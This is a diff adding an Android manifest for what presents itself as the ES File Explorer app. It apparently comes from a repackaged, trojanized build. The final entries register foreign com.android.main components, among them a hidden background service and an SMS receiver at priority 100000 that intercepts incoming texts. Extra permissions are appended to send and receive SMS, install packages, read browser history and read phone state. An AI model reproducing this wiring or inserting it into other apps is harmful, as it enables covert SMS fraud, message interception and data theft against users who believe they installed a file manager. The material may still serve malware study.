@@ -1,0 +1,175 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.estrongs.android.pop">
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-feature android:name="android.hardware.bluetooth" android:required="false"/>
+    <uses-permission android:name="com.estrongs.android.pop.PERMISSION"/>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+    <application android:icon="@drawable/fex" android:label="@string/app_name">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/bluetooth_permission_request" android:name="backport.android.bluetooth.RequestEnableActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="com.estrongs.android.pop.action.REQUEST_ENABLE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/bluetooth_permission_request" android:name="backport.android.bluetooth.RequestDiscoverableActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="com.estrongs.android.pop.action.REQUEST_DISCOVERABLE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <receiver android:name="backport.android.bluetooth.BluetoothIntentRedirector">
+            <intent-filter>
+                <action android:name="android.bluetooth.intent.action.DISCOVERY_COMPLETED"/>
+                <action android:name="android.bluetooth.intent.action.DISCOVERY_STARTED"/>
+                <action android:name="android.bluetooth.intent.action.NAME_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.SCAN_MODE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_DEVICE_CONNECTED"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_DEVICE_DISCONNECTED"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_DEVICE_DISCONNECT_REQUESTED"/>
+                <action android:name="android.bluetooth.intent.action.BOND_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.PAIRING_REQUEST"/>
+                <action android:name="android.bluetooth.intent.action.PAIRING_CANCEL"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_DEVICE_CLASS_UPDATED"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_DEVICE_FOUND"/>
+                <action android:name="android.bluetooth.intent.action.REMOTE_NAME_UPDATED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="singleTop" android:name=".view.FileExplorerActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.GET_CONTENT"/>
+                <category android:name="android.intent.category.OPENABLE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="*/*"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.estrongs.action.PICK_FILE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.estrongs.action.PICK_FILE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.estrongs.action.PICK_DIRECTORY"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.estrongs.action.PICK_DIRECTORY"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.estrongs.action.OPEN_DIRECTORY"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="resource/folder"/>
+            </intent-filter>
+        </activity>
+        <service android:name=".bt.OBEXFtpServerService">
+            <intent-filter>
+                <action android:name="android.intent.action.START_OBEX_FTP_SERVER"/>
+            </intent-filter>
+        </service>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.CreateSmbServerActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.CreateFtpServerActivity" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:name=".view.PopPreferenceActivity"/>
+        <activity android:name=".view.HelpActivity"/>
+        <activity android:label="@string/title_note" android:name=".app.PopNoteEditor" android:screenOrientation="sensor" android:theme="@android:style/Theme.Light">
+            <intent-filter android:label="@string/resolve_edit">
+                <action android:name="android.intent.action.VIEW"/>
+                <action android:name="android.intent.action.EDIT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="text/plain"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".app.ImageBrowser"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".app.PopRemoteImageBrowser"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".app.PopVideoPlayer" android:screenOrientation="sensor">
+            <intent-filter android:label="@string/video_player_label">
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="video/*"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name=".app.StreamingMediaPlayer" android:screenOrientation="sensor"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.TitleEditor" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/support_us" android:name=".view.SupportActivity"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.ConfirmTaskCancelDialog" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.SearchConditionView" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name=".view.NewUserView" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:name=".view.Property" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:name=".view.MultiFilesProperty" android:theme="@android:style/Theme.Dialog"/>
+        <receiver android:name=".scanner.WifiStateReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.LAN_SCAN"/>
+            </intent-filter>
+        </receiver>
+        <service android:name=".scanner.WifiNetworkScannerService">
+            <intent-filter>
+                <action android:name="android.intent.action.SCAN_WIFINETWORK"/>
+            </intent-filter>
+        </service>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_zip" android:launchMode="singleTop" android:name=".app.ZipViewer">
+            <intent-filter android:label="@string/app_zip">
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="application/zip"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_zip" android:name=".app.CompressActivity" android:theme="@android:style/Theme.Dialog">
+            <intent-filter android:label="@string/resolve_edit">
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/dialog_extract_to" android:name=".app.ArchiveExtractEditActivity" android:screenOrientation="sensor" android:theme="@android:style/Theme.Dialog"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_zip" android:name=".app.ArchiveProgressActivity" android:theme="@android:style/Theme.Dialog"/>
+        <service android:name=".app.ArchiveService"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/disk_usage" android:name=".app.diskusage.DiskUsageActivity">
+            <intent-filter>
+                <action android:name="com.estrongs.android.SHOW_DISK_USAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <provider android:authorities="com.estrongs.android.provider.fex" android:name=".FexProvider"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+</manifest>
